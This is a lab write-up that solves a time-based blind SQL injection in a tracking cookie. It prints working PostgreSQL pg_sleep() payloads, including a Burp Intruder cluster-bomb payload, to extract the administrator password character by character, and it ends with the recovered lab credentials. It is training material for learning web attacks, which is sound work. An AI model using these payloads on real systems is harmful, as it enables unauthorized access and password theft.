## Blind SQL injection with time delays and information retrieval

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.

## Notes

- `/login`
- `/filter?category=parameter`
- Vulnerable cookie: `TrackingId`

## Resume

1. Confirm time-based SQL injection
2. Trigger conditional delays with `pg_sleep()`
3. Extract password characters one by one
4. Log in as administrator

## Solve

First, confirm that the cookie is vulnerable to time-based SQL injection using PostgreSQL `pg_sleep()`:

```sql
'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- -
```

The server response is delayed by 10 seconds, confirming the vulnerability.

Test a conditional delay based on a character comparison:

```sql
'%3BSELECT CASE WHEN (substring(column,1,1)='1') THEN pg_sleep(10) ELSE pg_sleep(0) END-- -
```

If the condition is true, the response is delayed.

Use the following payload to extract the administrator password character by character:

```sql
x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Send the request to Burp Intruder and configure a **Cluster Bomb** attack:

- Position `§1§` → numbers from `1` to `20`
- Position `§a§` → characters `a-z0-9`

When a request takes around 10 seconds to respond, the tested character is correct.

Repeat the process until the full password is recovered.

Credentials :

```text
administrator:k3n1hevdo3ilx3q234mf
```